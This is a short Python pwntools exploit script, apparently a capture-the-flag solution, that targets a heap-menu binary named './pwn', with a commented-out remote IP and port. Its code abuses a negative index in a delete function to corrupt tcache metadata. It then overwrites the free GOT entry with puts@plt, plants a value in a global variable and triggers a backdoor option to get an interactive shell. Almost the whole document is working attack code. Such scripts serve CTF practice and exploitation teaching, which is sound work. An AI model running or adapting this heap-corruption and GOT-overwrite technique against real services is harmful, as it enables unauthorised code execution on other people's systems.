#coding:utf8
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
sh = process('./pwn')
# sh = remote('119.23.255.127',34212)
elf = ELF('./pwn')

def add(size,content):
   sh.sendlineafter('>','1')
   sh.sendline(str(size))
   sh.send(content)

def delete(index):
   sh.sendlineafter('>','2')
   sh.sendline(str(index))

def backdoor():
   sh.sendlineafter('>','3')


target = 0x404080
free_got = elf.got['free']
puts_plt = 0x401040
delete(-0x290)
payload = '\x01'*0x50 + p8(1)*0x10
payload = payload.ljust(0x100,'\x00')
payload += p64(target-0x10)
payload += p64(free_got)
payload = payload.ljust(0x280,'\x00')
add(0x280,payload)
gdb.attach(sh)


payload2 = p64(puts_plt) + p64(puts_plt)[0:6]
#修改free got为puts_plt
add(0x120,payload2 + '\n')

#raw_input()
add(0x110,p64(0)*2 + p64(0x6666) + '\n')
backdoor()

sh.interactive()
